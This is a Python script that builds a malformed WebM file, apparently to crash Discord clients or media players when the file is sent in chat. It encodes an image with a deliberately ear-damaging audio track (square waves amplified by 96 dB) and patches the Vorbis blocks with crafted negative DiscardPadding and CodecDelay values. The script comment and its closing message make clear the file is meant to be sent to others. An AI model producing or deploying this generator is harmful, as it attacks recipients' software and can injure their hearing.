from __future__ import annotations

import os
import shutil
import struct
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
IMAGE = os.path.join(HERE, "image.png")

CODEC_DELAY_NS = 2_666_667
SKIP_NS = -12_020_833
TRIGGER_NS = -20_833
TAIL_NS = 4_000_000

ID_SEGMENT = 0x18538067
ID_TRACKS = 0x1654AE6B
ID_TRACKENTRY = 0xAE
ID_TRACKNUMBER = 0xD7
ID_TRACKTYPE = 0x83
ID_CODECID = 0x86
ID_CODECDELAY = 0x56AA
ID_CLUSTER = 0x1F43B675
ID_SIMPLEBLOCK = 0xA3
ID_BLOCKGROUP = 0xA0
ID_BLOCK = 0xA1
ID_BLOCKDURATION = 0x9B
ID_DISCARD = 0x75A2
ID_CRC = 0xBF
ID_VOID = 0xEC


def ffmpeg() -> str:
    local = os.path.join(HERE, "ffmpeg.exe")
    if os.path.isfile(local):
        return local
    p = shutil.which("ffmpeg")
    if not p:
        raise SystemExit("ffmpeg not in PATH")
    return p


def run(cmd: list[str]) -> None:
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        raise SystemExit((r.stderr or r.stdout)[-2500:])


def read_id(data: bytes, i: int) -> tuple[int, int]:
    b0 = data[i]
    w = 1
    m = 0x80
    while w <= 8 and not (b0 & m):
        w += 1
        m >>= 1
    return int.from_bytes(data[i : i + w], "big"), w


def read_vint(data: bytes, i: int) -> tuple[int, int]:
    b0 = data[i]
    w = 1
    m = 0x80
    while w <= 8 and not (b0 & m):
        w += 1
        m >>= 1
    raw = int.from_bytes(data[i : i + w], "big")
    return raw & ((1 << (7 * w)) - 1), w


def write_id(eid: int) -> bytes:
    if eid <= 0xFF:
        return bytes([eid])
    if eid <= 0xFFFF:
        return eid.to_bytes(2, "big")
    if eid <= 0xFFFFFF:
        return eid.to_bytes(3, "big")
    return eid.to_bytes(4, "big")


def write_vint(n: int) -> bytes:
    for w in range(1, 9):
        maxv = (1 << (7 * w)) - 1
        if n < maxv:
            marker = 1 << (8 * w - w)
            return (marker | n).to_bytes(w, "big")
    raise ValueError("vint too big")


def write_element(eid: int, payload: bytes) -> bytes:
    return write_id(eid) + write_vint(len(payload)) + payload


def signed_int(n: int, width: int) -> bytes:
    return n.to_bytes(width, "big", signed=True)


def parse_children(data: bytes, start: int, end: int) -> list[tuple[int, bytes, list | None]]:
    out = []
    i = start
    while i < end:
        eid, iw = read_id(data, i)
        size, sw = read_vint(data, i + iw)
        payload = data[i + iw + sw : i + iw + sw + size]
        i = i + iw + sw + size
        kids_ids = {
            ID_SEGMENT, ID_TRACKS, ID_TRACKENTRY, ID_CLUSTER, ID_BLOCKGROUP,
            0x1549A966, 0xE0, 0xE1, 0x1254C367, 0x114D9B74,
        }
        kids = parse_children(payload, 0, len(payload)) if eid in kids_ids else None
        out.append((eid, payload, kids))
    return out


def serialize(nodes: list[tuple[int, bytes, list | None]]) -> bytes:
    chunks = []
    for eid, payload, kids in nodes:
        if kids is not None:
            payload = serialize(kids)
        chunks.append(write_element(eid, payload))
    return b"".join(chunks)


def block_track(payload: bytes) -> int:
    tn, _ = read_vint(payload, 0)
    return tn


def find_vorbis_track(nodes: list) -> int | None:
    for eid, payload, kids in nodes:
        if eid == ID_SEGMENT and kids:
            for seid, _, skids in kids:
                if seid == ID_TRACKS and skids:
                    for teid, _, tkids in skids:
                        if teid != ID_TRACKENTRY or not tkids:
                            continue
                        num = None
                        codec = None
                        ttype = None
                        for ceid, cpay, _ in tkids:
                            if ceid == ID_TRACKNUMBER:
                                num = int.from_bytes(cpay, "big")
                            elif ceid == ID_CODECID:
                                codec = cpay.decode("ascii", "replace")
                            elif ceid == ID_TRACKTYPE:
                                ttype = int.from_bytes(cpay, "big")
                        if codec == "A_VORBIS" or ttype == 2:
                            return num
        elif eid in {ID_TRACKS, ID_SEGMENT}:
            n = find_vorbis_track([(eid, payload, kids)])
            if n:
                return n
    return None


def ensure_codec_delay(nodes: list) -> None:
    for eid, payload, kids in nodes:
        if kids is None:
            continue
        if eid == ID_TRACKENTRY:
            codec = None
            has_delay = False
            for ceid, cpay, _ in kids:
                if ceid == ID_CODECID:
                    codec = cpay.decode("ascii", "replace")
                if ceid == ID_CODECDELAY:
                    has_delay = True
            if codec == "A_VORBIS" and not has_delay:
                kids.insert(0, (ID_CODECDELAY, write_vint(CODEC_DELAY_NS)[1:] and CODEC_DELAY_NS.to_bytes(3, "big"), None))
                # 3-byte unsigned
                kids[0] = (ID_CODECDELAY, CODEC_DELAY_NS.to_bytes(3, "big"), None)
            continue
        ensure_codec_delay(kids)


def make_padded_group(simple_payload: bytes, padding_ns: int, pad_width: int) -> tuple:
    block = (ID_BLOCK, simple_payload, None)
    dur = (ID_BLOCKDURATION, b"\x01", None)
    disc = (ID_DISCARD, signed_int(padding_ns, pad_width), None)
    return (ID_BLOCKGROUP, b"", [block, dur, disc])


def patch_clusters(nodes: list, audio_track: int) -> None:
    audio_seen = 0
    audio_nodes_refs: list[tuple[list, int]] = []

    def walk(kids: list) -> None:
        nonlocal audio_seen
        i = 0
        while i < len(kids):
            eid, payload, ckids = kids[i]
            if eid == ID_CRC:
                kids.pop(i)
                continue
            if eid == ID_CLUSTER and ckids is not None:
                walk(ckids)
                i += 1
                continue
            if eid in {ID_SIMPLEBLOCK, ID_BLOCKGROUP}:
                raw = payload
                if eid == ID_BLOCKGROUP and ckids:
                    for beid, bpay, _ in ckids:
                        if beid == ID_BLOCK:
                            raw = bpay
                            break
                if block_track(raw) == audio_track:
                    audio_nodes_refs.append((kids, i))
                    if audio_seen < 2:
                        kids[i] = make_padded_group(raw, SKIP_NS, 4)
                    elif audio_seen == 2:
                        kids[i] = make_padded_group(raw, TRIGGER_NS, 4)
                    audio_seen += 1
            i += 1

    for eid, _, kids in nodes:
        if eid == ID_SEGMENT and kids:
            walk(kids)
    if audio_nodes_refs:
        klist, idx = audio_nodes_refs[-1]
        eid, payload, ckids = klist[idx]
        raw = payload
        if eid == ID_BLOCKGROUP and ckids:
            for beid, bpay, _ in ckids:
                if beid == ID_BLOCK:
                    raw = bpay
                    break
        klist[idx] = make_padded_group(raw, TAIL_NS, 3)


def patch_webm(src: bytes) -> bytes:
    eid, iw = read_id(src, 0)
    size, sw = read_vint(src, iw)
    ebml = src[: iw + sw + size]
    rest = src[iw + sw + size :]
    nodes = parse_children(rest, 0, len(rest))
    ensure_codec_delay(nodes)
    vt = find_vorbis_track(nodes)
    if vt is None:
        raise SystemExit("no A_VORBIS track")
    patch_clusters(nodes, vt)
    return ebml + serialize(nodes)


def encode_seed(path: str) -> None:
    if not os.path.isfile(IMAGE):
        raise SystemExit(f"missing {IMAGE}")
    ff = ffmpeg()
    # Discord embed starts readable, then 2x2 cluster is optional; crash is audio.
    vf = "scale=786:310:force_original_aspect_ratio=decrease,pad=786:310:(ow-iw)/2:(oh-ih)/2,format=yuv420p"
    scream = (
        "sine=f=2093:r=48000:d=5,"
        "aeval='1*sgn(sin(2*PI*3136*t))+sgn(sin(2*PI*4186*t))+sgn(sin(2*PI*8000*t))+sgn(sin(2*PI*12000*t))':c=same,"
        "volume=96dB,acrusher=bits=1:mode=log:aa=0"
    )
    run([
        ff, "-y",
        "-loop", "1", "-framerate", "30", "-i", IMAGE,
        "-f", "lavfi", "-i", scream,
        "-map", "0:v", "-map", "1:a",
        "-t", "5", "-shortest",
        "-vf", vf,
        "-c:v", "libvpx-vp9", "-pix_fmt", "yuv420p", "-profile:v", "0",
        "-b:v", "200k", "-row-mt", "1", "-g", "150",
        "-c:a", "libvorbis", "-q:a", "10", "-ar", "48000", "-ac", "2",
        path,
    ])


def dest_path(name: str) -> str:
    if not name.lower().endswith(".webm"):
        name += ".webm"
    return os.path.join(HERE, name)


def build(out_name: str) -> str:
    seed = os.path.join(HERE, "_seed.webm")
    dest = dest_path(out_name)
    encode_seed(seed)
    raw = open(seed, "rb").read()
    out = patch_webm(raw)
    open(dest, "wb").write(out)
    try:
        os.remove(seed)
    except OSError:
        pass
    return dest


def main() -> None:
    name = sys.argv[1] if len(sys.argv) > 1 else "crash"
    path = build(name)
    print("wrote", path)
    print("786x310 VP9 yuv420 + Vorbis DiscardPadding — send as .webm only")


if __name__ == "__main__":
    main()
